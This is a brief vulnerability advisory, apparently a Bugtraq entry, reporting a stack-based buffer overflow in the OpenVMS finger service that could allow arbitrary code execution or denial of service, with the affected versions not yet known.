The finger service ('fingerd') on OpenVMS is prone to a stack-based buffer-overflow vulnerability because it fails to adequately bounds-check user-supplied input.

Attackers can exploit this issue to execute arbitrary code in the context of the affected application. Failed attempts will likely cause denial-of-service conditions.

We were not told which versions are affected. We will update this BID as more information emerges.
